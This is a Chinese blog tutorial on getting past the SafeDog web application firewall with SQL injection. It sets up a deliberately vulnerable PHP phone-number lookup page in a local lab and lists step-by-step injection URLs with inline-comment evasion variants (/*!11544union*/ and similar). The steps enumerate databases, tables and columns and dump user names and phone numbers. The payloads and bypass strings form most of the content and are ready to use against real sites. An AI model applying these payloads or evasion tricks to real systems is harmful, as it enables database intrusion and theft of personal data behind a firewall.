<!DOCTYPE html>
<html class="no-js" lang="en">
<head>
	<meta charset="UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<title>SQL注入绕过安全狗的五种方法 - 菜鸟程序员博客</title>
	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
	<meta name="description" content="">
		<meta property="og:title" content="SQL注入绕过安全狗的五种方法" />
<meta property="og:description" content="0x01：环境搭建
windows 10 操作系统
1，phpstudy2016
2，安全狗最新版，（切记以管理员身份启动安全狗）
安全狗配置插件问题请直击：
http://www.nvhack.com/forum.php?mod=viewthread&amp;tid=176
3，php文件一枚,名字 bihuo.php 代码如下：
&lt;!DOCTYPE html&gt; &lt;html&gt; &lt;head&gt; &lt;title&gt;必火网络安全培训-带你走进网络安全培训圈&lt;/title&gt; &lt;meta charset=&#34;utf-8&#34;&gt; &lt;meta http-equiv=&#34;refresh&#34; content=&#34;15&#34;&gt; &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width， initial-scale=1&#34;&gt; &lt;!-- 新 Bootstrap4 核心 CSS 文件 --&gt; &lt;link rel=&#34;stylesheet&#34; href=&#34;https://cdn.staticfile.org/twitter-bootstrap/4.3.1/css/bootstrap.min.css&#34;&gt; &lt;!-- jQuery文件。务必在bootstrap.min.js 之前引入 --&gt; &lt;script src=&#34;https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js&#34;&gt;&lt;/script&gt; &lt;!-- bootstrap.bundle.min.js 用于弹窗、提示、下拉菜单，包含了 popper.min.js --&gt; &lt;script src=&#34;https://cdn.staticfile.org/popper.js/1.15.0/umd/popper.min.js&#34;&gt;&lt;/script&gt; &lt;!-- 最新的 Bootstrap4 核心 JavaScript 文件 --&gt; &lt;script src=&#34;https://cdn.staticfile.org/twitter-bootstrap/4.3.1/js/bootstrap.min.js&#34;&gt;&lt;/script&gt; &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt; &lt;meta name=&#34;keywords&#34; content=&#34;网络安全培训,渗透测试培训,web安全培训&#34;&gt; &lt;meta name=&#34;description&#34; content=&#34;黑客网-由北京必火网络安全平台打造，从事网络安全白帽子黑客攻防web安全信息安全渗透测试教学培训，未来岗位有网络安全工程师，渗透测试工程师，安全服务工程师，一应急响应工程师等&#34;&gt; &lt;/head&gt; &lt;body&gt; &lt;nav class=&#34;" />
<meta property="og:type" content="article" />
<meta property="og:url" content="https://cainiaoprogram.github.io/posts/1bbbd63da1236fa10ebd5deec19dbc1f/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2023-01-11T21:09:47+08:00" />
<meta property="article:modified_time" content="2023-01-11T21:09:47+08:00" />


	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
	<link rel="dns-prefetch" href="//fonts.googleapis.com">
	<link rel="dns-prefetch" href="//fonts.gstatic.com">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">

	<link rel="stylesheet" href="/css/style.css">
	

	<link rel="shortcut icon" href="/favicon.ico">
		
</head>
<body class="body">
	<div class="container container--outer">
		<header class="header">
	<div class="container header__container">
		
	<div class="logo">
		<a class="logo__link" href="/" title="菜鸟程序员博客" rel="home">
			<div class="logo__item logo__text">
					<div class="logo__title">菜鸟程序员博客</div>
					
				</div>
		</a>
	</div>
		<div class="divider"></div>
	</div>
</header>
		<div class="wrapper flex">
			<div class="primary">
			
<main class="main" role="main">
	<article class="post">
		<header class="post__header">
			<h1 class="post__title">SQL注入绕过安全狗的五种方法</h1>
			
		</header>
		<div id="gatop"></div>
		<div class="content post__content clearfix">
			
<div id="content_views" class="markdown_views prism-atom-one-dark">
                    <svg xmlns="http://www.w3.org/2000/svg" style="display: none;">
                        <path stroke-linecap="round" d="M5,0 0,2.5 5,5z" id="raphael-marker-block" style="-webkit-tap-highlight-color: rgba(0, 0, 0, 0);"></path>
                    </svg>
                    <p>0x01：环境搭建<br> windows 10 操作系统</p> 
<p>1，phpstudy2016<br> 2，安全狗最新版，（切记以管理员身份启动安全狗）<br> 安全狗配置插件问题请直击：<br> http://www.nvhack.com/forum.php?mod=viewthread&amp;tid=176<br> 3，php文件一枚,名字 bihuo.php 代码如下：</p> 
<pre><code class="prism language-php"><span class="token operator">&lt;</span><span class="token operator">!</span><span class="token constant">DOCTYPE</span> html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>html<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>head<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>title<span class="token operator">&gt;</span>必火网络安全培训<span class="token operator">-</span>带你走进网络安全培训圈<span class="token operator">&lt;</span><span class="token operator">/</span>title<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>meta charset<span class="token operator">=</span><span class="token string double-quoted-string">"utf-8"</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>meta http<span class="token operator">-</span>equiv<span class="token operator">=</span><span class="token string double-quoted-string">"refresh"</span> content<span class="token operator">=</span><span class="token string double-quoted-string">"15"</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string double-quoted-string">"viewport"</span> content<span class="token operator">=</span><span class="token string double-quoted-string">"width=device-width， initial-scale=1"</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 新 Bootstrap4 核心 <span class="token constant">CSS</span> 文件 <span class="token operator">--</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>link rel<span class="token operator">=</span><span class="token string double-quoted-string">"stylesheet"</span> href<span class="token operator">=</span><span class="token string double-quoted-string">"https://cdn.staticfile.org/twitter-bootstrap/4.3.1/css/bootstrap.min.css"</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> jQuery文件。务必在bootstrap<span class="token operator">.</span>min<span class="token operator">.</span>js 之前引入 <span class="token operator">--</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string double-quoted-string">"https://cdn.staticfile.org/jquery/3.2.1/jquery.min.js"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> bootstrap<span class="token operator">.</span>bundle<span class="token operator">.</span>min<span class="token operator">.</span>js 用于弹窗、提示、下拉菜单，包含了 popper<span class="token operator">.</span>min<span class="token operator">.</span>js <span class="token operator">--</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string double-quoted-string">"https://cdn.staticfile.org/popper.js/1.15.0/umd/popper.min.js"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> 最新的 Bootstrap4 核心 JavaScript 文件 <span class="token operator">--</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>script src<span class="token operator">=</span><span class="token string double-quoted-string">"https://cdn.staticfile.org/twitter-bootstrap/4.3.1/js/bootstrap.min.js"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string double-quoted-string">"viewport"</span> content<span class="token operator">=</span><span class="token string double-quoted-string">"width=device-width, initial-scale=1.0"</span><span class="token operator">&gt;</span> 
  <span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string double-quoted-string">"keywords"</span> content<span class="token operator">=</span><span class="token string double-quoted-string">"网络安全培训,渗透测试培训,web安全培训"</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>meta name<span class="token operator">=</span><span class="token string double-quoted-string">"description"</span> content<span class="token operator">=</span><span class="token string double-quoted-string">"黑客网-由北京必火网络安全平台打造，从事网络安全白帽子黑客攻防web安全信息安全渗透测试教学培训，未来岗位有网络安全工程师，渗透测试工程师，安全服务工程师，一应急响应工程师等"</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>head<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>nav <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"navbar navbar-expand-md bg-dark navbar-dark fixed-top text-center mb-1"</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>a <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"navbar-brand"</span> href<span class="token operator">=</span><span class="token string double-quoted-string">"/"</span><span class="token operator">&gt;</span>必火安全签到查询系统<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>
   <span class="token operator">&lt;</span>button <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"navbar-toggler"</span> type<span class="token operator">=</span><span class="token string double-quoted-string">"button"</span> data<span class="token operator">-</span>toggle<span class="token operator">=</span><span class="token string double-quoted-string">"collapse"</span> data<span class="token operator">-</span>target<span class="token operator">=</span><span class="token string double-quoted-string">"#collapsibleNavbar"</span><span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>span <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"navbar-toggler-icon"</span><span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>span<span class="token operator">&gt;</span>
   <span class="token operator">&lt;</span><span class="token operator">/</span>button<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"collapse navbar-collapse"</span> id<span class="token operator">=</span><span class="token string double-quoted-string">"collapsibleNavbar"</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>ul <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"navbar-nav"</span><span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span>li <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"nav-item"</span><span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span><span class="token operator">!</span><span class="token operator">--</span> <span class="token operator">&lt;</span>a <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"nav-link"</span> href<span class="token operator">=</span><span class="token string double-quoted-string">"/"</span><span class="token operator">&gt;</span>必火安全签到系统<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span> <span class="token operator">--</span><span class="token operator">&gt;</span>
      <span class="token operator">&lt;</span><span class="token operator">/</span>li<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span><span class="token operator">/</span>ul<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>  
<span class="token operator">&lt;</span><span class="token operator">/</span>nav<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">?</span><span class="token class-name type-declaration">php</span> 
  <span class="token variable">$link</span> <span class="token operator">=</span> <span class="token function">mysqli_connect</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"localhost"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"root"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"qiandao"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token comment">// mysqli_charset_set($link,"utf-8");</span>
  <span class="token function">mysqli_set_charset</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token operator">?</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>center<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>h3 style<span class="token operator">=</span><span class="token string double-quoted-string">"margin-top: 60px;margin-bottom: 20px;"</span><span class="token operator">&gt;</span>【必安科技<span class="token operator">-</span>做最专业的网络安全高端人才培训】<span class="token operator">&lt;</span><span class="token operator">/</span>h3<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>form<span class="token operator">&gt;</span>
    输入手机号查询： <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"text"</span> name<span class="token operator">=</span><span class="token string double-quoted-string">"tel"</span><span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>input type<span class="token operator">=</span><span class="token string double-quoted-string">"submit"</span> value<span class="token operator">=</span><span class="token string double-quoted-string">"查询"</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span><span class="token operator">/</span>form<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>br<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span>table border<span class="token operator">=</span><span class="token string double-quoted-string">"1"</span> width<span class="token operator">=</span><span class="token string double-quoted-string">"60%"</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>tr<span class="token operator">&gt;</span><span class="token operator">&lt;</span>td<span class="token operator">&gt;</span>序号<span class="token operator">&lt;</span><span class="token operator">/</span>td<span class="token operator">&gt;</span><span class="token operator">&lt;</span>td<span class="token operator">&gt;</span>姓名<span class="token operator">&lt;</span><span class="token operator">/</span>td<span class="token operator">&gt;</span><span class="token operator">&lt;</span>td<span class="token operator">&gt;</span>状态<span class="token operator">&lt;</span><span class="token operator">/</span>td<span class="token operator">&gt;</span><span class="token operator">&lt;</span>td<span class="token operator">&gt;</span>总签到次数<span class="token operator">&lt;</span><span class="token operator">/</span>td<span class="token operator">&gt;</span><span class="token operator">&lt;</span><span class="token operator">/</span>tr<span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span><span class="token operator">?</span>php 
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">empty</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tel'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
      <span class="token variable">$tel</span> <span class="token operator">=</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'tel'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
      <span class="token comment">// $tel = intval($tel);</span>
      <span class="token comment">// $tel = str_replace("'", "", $tel);</span>
      <span class="token variable">$num</span> <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
      <span class="token variable">$sql</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"select * from users where tel = '<span class="token interpolation"><span class="token variable">$tel</span></span>'"</span><span class="token punctuation">;</span>
      <span class="token variable">$result</span> <span class="token operator">=</span> <span class="token function">mysqli_query</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">,</span><span class="token variable">$sql</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">mysqli_num_rows</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token variable">$row</span> <span class="token operator">=</span> <span class="token function">mysqli_fetch_assoc</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;tr&gt;&lt;td&gt;<span class="token interpolation"><span class="token variable">$num</span></span>&lt;/td&gt;&lt;td&gt;<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;/td&gt;"</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'status'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
          <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;td&gt;&lt;span style='color:red'&gt;已签到&lt;/span&gt;&lt;/td&gt;"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
          <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;td&gt;王者荣耀征战中&lt;/td&gt;"</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;td&gt;<span class="token interpolation"><span class="token punctuation">{<!-- --></span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'count'</span><span class="token punctuation">]</span><span class="token punctuation">}</span></span>&lt;/td&gt;&lt;/tr&gt;"</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span><span class="token keyword">else</span><span class="token punctuation">{<!-- --></span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"【查无此人】"</span><span class="token punctuation">;</span>
      <span class="token punctuation">}</span>
      <span class="token function">mysqli_free_result</span><span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">mysqli_close</span><span class="token punctuation">(</span><span class="token variable">$link</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
   <span class="token operator">?</span><span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>table<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>center<span class="token operator">&gt;</span>

<span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"card bg-dark text-white mt-1 text-center"</span> id<span class="token operator">=</span><span class="token string double-quoted-string">"lianxi"</span><span class="token operator">&gt;</span>
  <span class="token operator">&lt;</span>div <span class="token keyword">class</span><span class="token operator">=</span><span class="token string double-quoted-string">"card-body"</span><span class="token operator">&gt;</span> 必火网络安全培训 <span class="token operator">&lt;</span>br<span class="token operator">&gt;</span>
    <span class="token operator">&lt;</span>br<span class="token operator">&gt;</span>
    @<span class="token number">2019</span> 版权所 北京必安科技有限公司 www<span class="token operator">.</span>hacker<span class="token operator">.</span>wang <span class="token operator">&lt;</span>a href<span class="token operator">=</span><span class="token string double-quoted-string">"http://www.hacker.wang"</span><span class="token operator">&gt;</span>黑客网<span class="token operator">&lt;</span><span class="token operator">/</span>a<span class="token operator">&gt;</span>  
  <span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>div<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>body<span class="token operator">&gt;</span>
<span class="token operator">&lt;</span><span class="token operator">/</span>html<span class="token operator">&gt;</span>
</code></pre> 
<p>4，数据库配置文件：sql内容如下，请建立数据库后-&gt;新建查询执行，别忘记php文件中更改数据库名字</p> 
<pre><code class="prism language-php"><span class="token constant">DROP</span> <span class="token constant">TABLE</span> <span class="token keyword">IF</span> <span class="token constant">EXISTS</span> <span class="token string backtick-quoted-string">`users`</span><span class="token punctuation">;</span>
<span class="token constant">CREATE</span> <span class="token constant">TABLE</span> <span class="token string backtick-quoted-string">`users`</span> <span class="token punctuation">(</span>
  <span class="token string backtick-quoted-string">`id`</span> <span class="token keyword type-declaration">int</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">)</span> <span class="token constant">NOT</span> <span class="token constant">NULL</span> <span class="token constant">AUTO_INCREMENT</span><span class="token punctuation">,</span>
  <span class="token string backtick-quoted-string">`username`</span> <span class="token function">varchar</span><span class="token punctuation">(</span><span class="token number">100</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
  <span class="token string backtick-quoted-string">`tel`</span> <span class="token function">bigint</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
  <span class="token string backtick-quoted-string">`status`</span> <span class="token function">tinyint</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
  <span class="token string backtick-quoted-string">`count`</span> <span class="token keyword type-declaration">int</span><span class="token punctuation">(</span><span class="token number">11</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
  <span class="token string backtick-quoted-string">`code`</span> <span class="token keyword type-declaration">int</span><span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">)</span> <span class="token keyword">DEFAULT</span> <span class="token constant">NULL</span><span class="token punctuation">,</span>
  <span class="token constant">PRIMARY</span> <span class="token function">KEY</span> <span class="token punctuation">(</span><span class="token string backtick-quoted-string">`id`</span><span class="token punctuation">)</span>
<span class="token punctuation">)</span> <span class="token constant">ENGINE</span><span class="token operator">=</span>MyISAM <span class="token constant">AUTO_INCREMENT</span><span class="token operator">=</span><span class="token number">49</span> <span class="token keyword">DEFAULT</span> <span class="token constant">CHARSET</span><span class="token operator">=</span>utf8<span class="token punctuation">;</span>
<span class="token comment">#</span>
<span class="token comment"># Data for table "users"</span>
<span class="token comment">#</span>
<span class="token comment">/*!40000 ALTER TABLE `users` DISABLE KEYS */</span><span class="token punctuation">;</span>
<span class="token constant">INSERT</span> <span class="token constant">INTO</span> <span class="token string backtick-quoted-string">`users`</span> <span class="token function">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'必火安全'</span><span class="token punctuation">,</span><span class="token number">13512341234</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token constant">NULL</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'渗透测试'</span><span class="token punctuation">,</span><span class="token number">18811111111</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">3359</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">/*!40000 ALTER TABLE `users` ENABLE KEYS */</span><span class="token punctuation">;</span>
</code></pre> 
<p>0x02：测试网站功能并且确定注入类型<br> 1，输入手机号，查询签到的人，功能正常<br> <img src="https://images2.imgbox.com/7f/73/WGVDq2TE_o.png" alt="在这里插入图片描述"><br> 2，输入 1’ or 1 and 1 --+ (意思是闭合参数tel的单引号，or 1 and 1 让条件结果为真，无论1是否存在都会返回数据，–+ 闭合后面的其他语句）回显页面正常<br> <img src="https://images2.imgbox.com/c9/1f/q046fVvN_o.png" alt="在这里插入图片描述"><br> 输入 1’ or 1 and 0 --+(页面显示不正常，and 0 生效 确定字符型注入)<br> <img src="https://images2.imgbox.com/85/62/ejzvy2sj_o.png" alt="在这里插入图片描述"><br> 0x03：第一种绕过方法，启动安全狗，开启所有防护<br> <img src="https://images2.imgbox.com/a3/7d/nZWQnhRA_o.png" alt="在这里插入图片描述"></p> 
<p>No.1 内联注释(/<em>![12345]</em>/)绕过方法：<br> /<em>!select</em>/: 相当于没有注释<br> /<em>!12345select</em>/: 当12345小于当前mysql版本号的时候，注释不生效，当大于版本号的时候注释生效。<br> /<em>![]</em>/: []中括号中的数字若填写则必须是5位<br> 1,执行检测安全狗功能</p> 
<pre><code class="prism language-php">http<span class="token punctuation">:</span><span class="token comment">//192.168.31.142/safedog/bihuo.php?tel=1' or 1 and 1=1--+</span>
</code></pre> 
<p><img src="https://images2.imgbox.com/a8/19/zdQImCXM_o.png" alt="在这里插入图片描述"><br> 拦截绕过方法：<br> http://192.168.31.142/safedog/bihuo.php?tel=1’ or -1 and -1=-1–+<br> <img src="https://images2.imgbox.com/b3/af/OKFZ4tE8_o.png" alt="在这里插入图片描述"><br> 2，判断列数<br> 执行语句：<br> http://192.168.31.142/safedog/bihuo.php?tel=1’ or 1 order by 1–+<br> <img src="https://images2.imgbox.com/03/4f/o6sIN0jp_o.png" alt="在这里插入图片描述"><br> 绕过方法：<br> http://192.168.31.142/safedog/bihuo.php?tel=1’ or -1/<em>!11544order/</em>!11544by/<em>!11544</em>/1–+<br> 确定列数位为6<br> <img src="https://images2.imgbox.com/fe/21/o7rnjyT5_o.png" alt="在这里插入图片描述"><br> 3,联合查询判断显示位：union 联合查询说明<br> union必须由两条或两条以上的select语句组成，语句之间用关键字Union分隔Union中的每个查询必须包含相同的列<br> 执行语句：<br> http://192.168.31.142/safedog/bihuo.php?tel=1’ or -1 union select 1,2,3,4,5,6–+<br> <img src="https://images2.imgbox.com/58/2e/FohR4PdY_o.png" alt="在这里插入图片描述"><br> 绕过方法：<br> http://192.168.31.142/safedog/bihuo.php?tel=1’ or -1/<em>!11544union/</em>!11544select/<em>!115441,2,3,4,5,6</em>/–+<br> <img src="https://images2.imgbox.com/d5/ab/QFZ5pkMr_o.png" alt="在这里插入图片描述"><br> 去掉or -1 得到显示位（意识是没有or -1 那么联合查询结果为假，将不再返回第一条数据，而是显示union后的结果，也就是123456，从而得到显示位）<br> <img src="https://images2.imgbox.com/69/9f/lzervbl3_o.png" alt="在这里插入图片描述"><br> 4，获取所有数据库名字<br> http://192.168.31.142/safedog/bihuo.php?tel=1’ union select 1,2,3,4,group_concat(schema_name),6 from information_schema.schemata–+<br> group_concat() 这个函数是把多行数据放到一行显示<br> <img src="https://images2.imgbox.com/b6/58/8hitzIdt_o.png" alt="在这里插入图片描述"><br> 绕过方法：<br> http://192.168.31.142/safedog/bihuo.php?tel=1’ /<em>!11544union/</em>!11544select/<em>!115441,2,3,4,group_concat(schema_name),6</em>/from information_schema.schemata–+<br> <img src="https://images2.imgbox.com/69/9c/pi4b4jEo_o.png" alt="在这里插入图片描述"></p> 
<p>5，获取当前数据库下所有表名<br> 执行语句<br> http://192.168.31.142/safedog/bihuo.php?tel=1’ union select 1,2,3,4,group_concat(table_name),6 from information_schema.tables where table_schema=database()–+<br> <img src="https://images2.imgbox.com/90/cc/UIjMiUG8_o.png" alt="在这里插入图片描述"><br> 绕过方法：<br> http://192.168.31.142/safedog/bihuo.php?tel=1’ /<em>!11544union /</em>!11544select/<em>!115441,2,3,4,/</em>!11544group_concat(/<em>!11544table_name),6/</em>!11544from/<em>!11544information_schema.tables/</em>!11544where/<em>!11544table_schema=/</em>!11544database/<em>!11544()</em>/–+<br> <img src="https://images2.imgbox.com/6e/06/VLZ1zNXN_o.png" alt="在这里插入图片描述"><br> 这里有一点比较重要database() 可以变成database/<em>!11544()</em>/<br> 6，获取当前用户表users下所有列名<br> 执行语句：<br> http://192.168.31.142/safedog/bihuo.php?tel=1’ union select 1,2,3,4,group_concat(column_name),6 from information_schema.columns where table_schema=database() and table_name=‘users’–+<br> <img src="https://images2.imgbox.com/8f/bd/dRMigSBm_o.png" alt="在这里插入图片描述"><br> 绕过方法：<br> http://192.168.31.142/safedog/bihuo.php?tel=1’/<em>!11544union/</em>!11544select 1,2,3,4, group_concat(column_name),6 from information_schema.columns where table_schema in (database/<em>!11544()) and table_name in (0x7573657273)</em>/–+<br> <img src="https://images2.imgbox.com/d7/34/r695qvpz_o.png" alt="在这里插入图片描述"></p> 
<p>7，有表名，有列名，那就可以获取当前表的所有内容<br> 执行语句直接绕过：<br> http://192.168.31.142/safedog/bihuo.php?tel=1’/<em>!11544union /</em>!11544select 1,2,3,4, group_concat(concat_ws(0x23,username,tel)),6 from users*/–+<br> <img src="https://images2.imgbox.com/01/58/qYDL0vqD_o.png" alt="在这里插入图片描述"><br> 解析：<br> 这里的concat_ws 为mysql中的函数，作用是链接两个字符变量，这里把username和tel拼接在一起，用0x23分割，0x23是"#"的16进制编码。至此绕狗成功！<br> 下面介绍其他方法，直接走倒数第二个步骤获取列名了，因为这一步过了，其他基本上全能过。</p> 
<p>0x04: 第二种绕过方法，内联注释另类思想绕过<br> 传统的方法使用内联注释都是使用 /<em>!12345select</em>/ 去注释SQL关键字符来进行绕waf，那么为什么非得注释关键字呢，她是美女么？有我们必火的小女生好看吗？如果不是美女，也没我们的小女生好看，那能不能不注释关键字，注释点别的好不好？<br> 执行语句：<br> <img src="https://images2.imgbox.com/d9/7f/Z5a2sLPX_o.png" alt="在这里插入图片描述"><br> 解析：<br> 图中两处 /<em>!88888www.hacker.wang</em>/ 即可绕狗 ：88888 肯定大于当前啊版本号，所以注释内容不执行，等于没有加这句话，不影响程序运行。<br> 下面的表名要换成16进制。<br> 注意database()中间有个空格</p> 
